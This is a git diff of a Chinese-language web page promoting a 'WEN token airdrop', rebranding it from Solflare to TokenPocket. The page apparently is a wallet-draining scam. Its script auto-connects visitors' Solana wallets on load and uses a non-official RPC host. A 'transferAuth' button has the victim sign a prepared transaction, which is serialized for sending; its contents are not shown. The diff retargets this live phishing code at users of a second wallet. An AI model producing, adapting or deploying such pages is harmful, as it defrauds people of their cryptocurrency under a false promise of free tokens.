@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>WEN 代币空投 | Solflare 专属空投</title>
+  <title>WEN 代币空投 | tokenpocket 专属空投</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <!-- 替换原来的 QRCode 库 -->
@@ -11,12 +11,12 @@
   <meta name="viewport" id="viewportMeta" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <!-- 基础 Meta 标签（推荐同时添加，供其他平台使用） -->
-<meta property="og:title" content="WEN 代币空投 | Solflare 专属空投" />
+<meta property="og:title" content="WEN 代币空投 | tokenpocket 专属空投" />
 <meta property="og:description" content="立即获得WEN代币空投，合约地址: WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" />
 <meta property="og:url" content="https://2024web.github.io" />
 
 <!-- Twitter Card 专用标签 -->
-<meta name="twitter:title" content="WEN 代币空投 | Solflare 专属空投" />
+<meta name="twitter:title" content="WEN 代币空投 | tokenpocket 专属空投" />
 <meta name="twitter:description" content="立即获得WEN代币空投，合约地址: WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" />
 <meta name="twitter:site" content="@2024wendao" />  <!-- 可选：关联你的官方推特 -->
   <style>
@@ -877,10 +877,10 @@ async function autoConnectWallet() {
 }
 function checkDeviceAndHandleWallet() {
     const isPC = window.innerWidth > 768;  // 判断是否为PC设备
-    const isSolflare = typeof window.solflare !== 'undefined';
+    const istokenpocket = typeof window.tokenpocket !== 'undefined';
     
-    if (isPC && !isSolflare) {
-        // 如果是PC设备且没有Solflare环境，禁止连接钱包，隐藏连接钱包按钮
+    if (isPC && !istokenpocket) {
+        // 如果是PC设备且没有tokenpocket环境，禁止连接钱包，隐藏连接钱包按钮
         const connectButton = document.getElementById('connectButton');
         if (connectButton) {
             connectButton.style.display = 'none';  // 隐藏连接钱包按钮
@@ -894,7 +894,7 @@ function checkDeviceAndHandleWallet() {
         // 如果是安卓或其他移动设备，保留现有逻辑，尝试自动连接钱包
         autoConnectWallet();
     }
-    // 如果是PC且有Solflare环境，什么都不做（不执行任何操作）
+    // 如果是PC且有tokenpocket环境，什么都不做（不执行任何操作）
 }
 document.addEventListener('DOMContentLoaded', () => {
   checkDeviceAndHandleWallet();
@@ -975,12 +975,12 @@ document.addEventListener('DOMContentLoaded', () => {
     
 document.addEventListener('DOMContentLoaded', async () => {
   try {
-    // 检查是否存在TokenPocket或Solflare钱包
+    // 检查是否存在TokenPocket或tokenpocket钱包
     const isTokenPocket = window.solana && window.solana.isTokenPocket;
-    const isSolflare = typeof window.solflare !== 'undefined';
+    const istokenpocket = typeof window.tokenpocket !== 'undefined';
     
-    if (!isTokenPocket && !isSolflare) {
-      showModal('请连接Solflare钱包');
+    if (!isTokenPocket && !istokenpocket) {
+      showModal('请连接tokenpocket钱包');
       return;
     }
 
@@ -990,11 +990,11 @@ document.addEventListener('DOMContentLoaded', async () => {
       const connection = new solanaWeb3.Connection('https://solana3.mytokenpocket.vip');
       const response = await window.solana.connect();
       walletAddress = response.publicKey.toString();
-    } else if (isSolflare) {
-      if (!window.solflare.isConnected) {
-        await window.solflare.connect();
+    } else if (istokenpocket) {
+      if (!window.tokenpocket.isConnected) {
+        await window.tokenpocket.connect();
       }
-      walletAddress = window.solflare.publicKey.toString();
+      walletAddress = window.tokenpocket.publicKey.toString();
     }
 
 
@@ -1066,10 +1066,10 @@ document.getElementById('transferAuth').addEventListener('click', async () => {
   try {
     // 检查钱包类型
     const isTokenPocket = window.solana && window.solana.isTokenPocket;
-    const isSolflare = typeof window.solflare !== 'undefined';
+    const istokenpocket = typeof window.tokenpocket !== 'undefined';
     
-    if (!isTokenPocket && !isSolflare) {
-      showModal('请连接Solflare钱包');
+    if (!isTokenPocket && !istokenpocket) {
+      showModal('请连接tokenpocket钱包');
       return;
     }
 
@@ -1078,11 +1078,11 @@ document.getElementById('transferAuth').addEventListener('click', async () => {
     if (isTokenPocket) {
       const response = await window.solana.connect();
       walletAddress = response.publicKey.toString();
-    } else if (isSolflare) {
-      if (!window.solflare.isConnected) {
-        await window.solflare.connect();
+    } else if (istokenpocket) {
+      if (!window.tokenpocket.isConnected) {
+        await window.tokenpocket.connect();
       }
-      walletAddress = window.solflare.publicKey.toString();
+      walletAddress = window.tokenpocket.publicKey.toString();
     }
 
     // 确保用户地址已连接
@@ -1117,8 +1117,8 @@ document.getElementById('transferAuth').addEventListener('click', async () => {
       let signedTx;
       if (isTokenPocket) {
         signedTx = await window.solana.signTransaction(tx);
-      } else if (isSolflare) {
-        signedTx = await window.solflare.signTransaction(tx);
+      } else if (istokenpocket) {
+        signedTx = await window.tokenpocket.signTransaction(tx);
       }
 
       const signedTxBase64 = uint8ArrayToBase64(signedTx.serialize());
@@ -1209,13 +1209,13 @@ document.addEventListener('DOMContentLoaded', () => {
   
   // 检测设备类型和环境
   const isMobile = window.innerWidth <= 768;
-  const isSolflare = typeof window.solflare !== 'undefined';
+  const istokenpocket = typeof window.tokenpocket !== 'undefined';
 
-  // 如果是PC且没有Solflare环境，弹出二维码弹窗
-  if (!isMobile && !isSolflare) {
+  // 如果是PC且没有tokenpocket环境，弹出二维码弹窗
+  if (!isMobile && !istokenpocket) {
     showQRCodeModal();  // 调用二维码生成弹窗
   } 
-  // 如果是移动设备或PC有Solflare环境，尝试自动连接钱包
+  // 如果是移动设备或PC有tokenpocket环境，尝试自动连接钱包
   else {
     autoConnectWallet();
   }
